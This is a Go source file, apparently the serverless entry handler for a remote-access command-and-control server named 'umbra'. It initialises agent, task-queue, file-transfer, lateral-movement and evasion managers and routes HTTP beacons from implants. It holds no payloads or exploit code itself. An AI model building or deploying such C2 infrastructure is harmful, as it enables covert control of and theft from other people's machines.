package umbra

import (
	"log"
	"net/http"
	"net/url"
	"os"
	"sync"
	"time"

	"github.com/gin-contrib/cors"
	"github.com/gin-gonic/gin"

	"chemicalumbra.dev/server/pkg/agent"
	"chemicalumbra.dev/server/pkg/api"
	"chemicalumbra.dev/server/pkg/config"
	"chemicalumbra.dev/server/pkg/db"
	"chemicalumbra.dev/server/pkg/evasion"
	"chemicalumbra.dev/server/pkg/filetransfer"
	"chemicalumbra.dev/server/pkg/lateral"
	"chemicalumbra.dev/server/pkg/task"
	"chemicalumbra.dev/server/pkg/ws"
)

var (
	once    sync.Once
	engine  *gin.Engine
	initErr error
)

// Handler is the Vercel/serverless entry. HTTP beacons and REST work;
// long-lived WebSocket upgrades will not survive a function freeze.
func Handler(w http.ResponseWriter, r *http.Request) {
	once.Do(boot)
	if initErr != nil {
		http.Error(w, "boot: "+initErr.Error(), http.StatusInternalServerError)
		return
	}
	if orig := r.Header.Get("x-forwarded-uri"); orig != "" {
		if u, err := url.Parse(orig); err == nil && u.Path != "" && u.Path != "/api" {
			r.URL.Path = u.Path
			if u.RawQuery != "" {
				r.URL.RawQuery = u.RawQuery
			}
		}
	}
	engine.ServeHTTP(w, r)
}

func boot() {
	gin.SetMode(gin.ReleaseMode)

	if os.Getenv("RATC2_DATABASE_PATH") == "" {
		_ = os.Setenv("RATC2_DATABASE_PATH", "/tmp/umbra.db")
	}
	if os.Getenv("PORT") == "" {
		_ = os.Setenv("PORT", "8080")
	}

	cfg := config.Load()
	if cfg.FileStorage.Path == "" || cfg.FileStorage.Path == "./data/files" {
		cfg.FileStorage.Path = "/tmp/umbra-files"
	}
	_ = os.MkdirAll(cfg.FileStorage.Path, 0755)

	api.RestoreDBFromBlob(cfg.Database.Path)
	database, err := db.Init(cfg.Database.Path)
	if err != nil {
		initErr = err
		log.Printf("[umbra] db init: %v", err)
		return
	}

	agentMgr := agent.NewManager(database)
	taskQueue := task.NewQueue(database, agentMgr)
	fileMgr := filetransfer.NewManager(database, cfg.FileStorage.Path)
	lateralMgr := lateral.NewManager()
	evasionMgr := evasion.NewManager()
	evasionMgr.SetDB(database)
	evasionMgr.SetAgentManager(agentMgr)
	wsHub := ws.NewHub(agentMgr, taskQueue, fileMgr)
	go wsHub.Run()

	api.SetDB(database)
	api.StartDBSnapshotter(cfg.Database.Path)

	r := gin.New()
	r.Use(gin.Recovery())
	r.Use(cors.New(cors.Config{
		AllowOriginFunc:  api.AllowedOrigin,
		AllowMethods:     []string{"GET", "POST", "PUT", "PATCH", "DELETE", "OPTIONS"},
		AllowHeaders:     []string{"Origin", "Content-Type", "Authorization", "X-Requested-With"},
		ExposeHeaders:    []string{"Content-Length"},
		AllowCredentials: true,
		MaxAge:           12 * time.Hour,
	}))

	api.RegisterRoutes(r, agentMgr, taskQueue, fileMgr, lateralMgr, evasionMgr, wsHub, cfg)
	engine = r
	log.Printf("[umbra] handler ready db=%s files=%s", cfg.Database.Path, cfg.FileStorage.Path)
}
